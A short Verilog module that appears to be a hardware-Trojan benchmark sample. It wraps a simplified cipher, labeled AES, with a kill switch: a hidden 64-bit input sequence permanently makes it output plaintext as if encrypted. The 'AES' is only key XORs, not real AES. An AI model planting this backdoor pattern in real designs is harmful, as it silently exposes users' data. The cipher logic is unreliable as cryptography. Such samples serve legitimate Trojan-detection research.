// AES-T300: AES with kill switch Trojan

module aes_killswitch(
    input clk,
    input rst,
    input [127:0] data_in,
    input [127:0] key,
    input encrypt,
    output reg [127:0] data_out,
    output reg valid
);

    reg [127:0] state;
    reg [3:0] round;
    reg processing;

    // Trojan: kill switch - disable encryption permanently
    reg [63:0] Trojan_kill_sequence;
    wire kill_trigger = (Trojan_kill_sequence == 64'hDEADBEEFCAFEBABE);
    reg kill_active;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            state <= 128'b0;
            data_out <= 128'b0;
            valid <= 1'b0;
            round <= 4'b0;
            processing <= 1'b0;
            Trojan_kill_sequence <= 64'b0;
            kill_active <= 1'b0;
        end else begin
            valid <= 1'b0;

            // Trojan: build kill sequence
            Trojan_kill_sequence <= {Trojan_kill_sequence[55:0], data_in[7:0]};

            if (kill_trigger) begin
                kill_active <= 1'b1;
            end

            if (encrypt && !processing) begin
                processing <= 1'b1;
                // Trojan: if killed, pass through plaintext
                if (kill_active) begin
                    state <= data_in;
                end else begin
                    state <= data_in ^ key;
                end
                round <= 4'd1;
            end else if (processing) begin
                // Simplified AES rounds
                if (!kill_active) begin
                    state <= state ^ {key[63:0], key[127:64]};
                end
                round <= round + 1;

                if (round == 4'd10) begin
                    processing <= 1'b0;
                    data_out <= state;
                    valid <= 1'b1;
                end
            end
        end
    end

endmodule
